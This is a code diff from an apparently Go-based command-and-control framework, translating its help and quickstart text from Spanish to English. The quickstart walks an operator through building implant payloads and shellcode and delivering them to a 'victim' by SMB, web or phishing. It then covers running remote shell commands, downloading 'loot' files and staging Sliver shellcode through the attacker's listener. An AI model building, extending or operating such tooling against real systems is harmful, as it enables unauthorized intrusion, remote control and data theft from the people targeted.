@@ -734,9 +734,9 @@ Session commands (require 'use <id>'):
   back                             deselect agent
 
 Tips:
-  · TAB autocompleta comandos, IDs de agentes y rutas de archivo
-  · Flecha ↑↓ navega el historial de comandos
-  · Ctrl+C cancela la línea actual
+  · TAB autocompletes commands, agent IDs, and file paths
+  · Up/Down arrows navigate command history
+  · Ctrl+C cancels the current line
 
 `)
 }
@@ -747,49 +747,49 @@ func printQuickstart() {
 │                  C2 — QUICKSTART                    │
 └─────────────────────────────────────────────────────────────────┘
 
-PASO 1 — Compilar el servidor (solo la primera vez)
+STEP 1 — Build the server (first time only)
   $ go build -o bin/c2-server ./cmd/server/
   $ ./bin/c2-server -http-port 8080 -mtls-port 8443
 
-PASO 2 — Generar payload HTTP (más simple)
+STEP 2 — Generate HTTP payload (simpler)
   c2> build http <IP_KALI> [sleep_sec] [jitter_pct]
-  Ejemplo:
+  Example:
     c2> build http 192.168.1.10 60 20
-  Genera:
-    bin/agent.exe   → ejecutable Windows
-    bin/agent.bin   → shellcode raw
+  Generates:
+    bin/agent.exe   → Windows executable
+    bin/agent.bin   → raw shellcode
 
-PASO 3 — Generar payload mTLS (más seguro)
+STEP 3 — Generate mTLS payload (more secure)
   c2> gencert victim1
   c2> build mtls 192.168.1.10
-  Genera:
+  Generates:
     bin/agent-mtls.exe
 
-PASO 4 — Entregar el payload al objetivo
-  · Copiar agent.exe via SMB, web, phishing
-  · Usar agent.bin como shellcode en un loader
-  · Ejecutar directo en la víctima
+STEP 4 — Deliver the payload to the target
+  · Copy agent.exe via SMB, web, phishing
+  · Use agent.bin as shellcode in a loader
+  · Execute directly on the victim
 
-PASO 5 — Esperar conexión y operar
+STEP 5 — Wait for connection and operate
   c2> agents
-  c2> use <TAB para autocompletar ID>
+  c2> use <TAB to autocomplete ID>
   c2 [abc12345]> shell whoami
   c2 [abc12345]> shell ipconfig /all
   c2 [abc12345]> download C:\Users\victim\loot.txt
   c2 [abc12345]> sleep 30 10
 
-PASO 6 — Handoff a Sliver (stage 2)
-  # En el entorno externo:
+STEP 6 — Handoff to Sliver (stage 2)
+  # In the external environment:
   sliver > generate --http <IP_KALI>:8888 --format shellcode --os windows --arch amd64 --save /tmp/sliver.bin
 
-  # En c2:
+  # In c2:
   c2 [abc12345]> stage2 /tmp/sliver.bin
 
-NOTAS:
-  · Listeners HTTP (:8080) y mTLS (:8443) arrancan automáticamente
-  · Los certs TLS se generan solos en certs/ al iniciar
-  · Base de datos en data/c2.db (SQLite)
-  · Historial de comandos en data/.history
+NOTES:
+  · HTTP (:8080) and mTLS (:8443) listeners start automatically
+  · TLS certs are auto-generated in certs/ on startup
+  · Database at data/c2.db (SQLite)
+  · Command history at data/.history
 
 `)
 }
